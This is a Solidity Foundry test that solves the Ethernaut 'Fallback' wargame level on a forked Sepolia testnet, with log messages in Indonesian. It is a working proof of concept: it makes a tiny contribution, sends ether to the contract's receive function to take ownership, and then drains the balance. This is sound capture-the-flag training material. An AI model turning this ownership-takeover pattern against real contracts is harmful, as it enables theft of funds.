// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../02-Fallback/FallbackFactory.sol";
import "forge-std/Test.sol";

contract FallbackAttack is Test {
    function test() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        FallbackFactory fallbackfactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackfactory);
        console.log("setup ethernaut");
        address alice = makeAddr("alice");
        vm.deal(alice, 1 ether);
        vm.startPrank(alice, alice);
        address fallbackaddr = ethernaut.createLevelInstance(fallbackfactory);
        Fallback fallbackethernaut = Fallback(payable(fallbackaddr));
        emit log_named_address("fallback", address(fallbackethernaut));
        console.log("PoC:");
        console.log("1. contribute() dengan value < 0.001 ether");
        fallbackethernaut.contribute{value: 100 wei}();
        console.log("2. cek contribution");
        emit log_named_uint("kontribusi", fallbackethernaut.getContribution());
        assertGt(fallbackethernaut.getContribution(), 0);
        console.log("3. kirim ether ke contract untuk mengklaim kepemilikan");
        (bool terkirim,) = address(fallbackethernaut).call{value: 100 wei}("");
        if (terkirim) {
            console.log("4. cek address owner");
            assertEq(alice, fallbackethernaut.owner());
        }
        console.log("5. withdraw");
        fallbackethernaut.withdraw();
        console.log("submit level");
        bool sukses = ethernaut.submitLevelInstance(payable(address(fallbackethernaut)));
        assertTrue(sukses);
    }
}
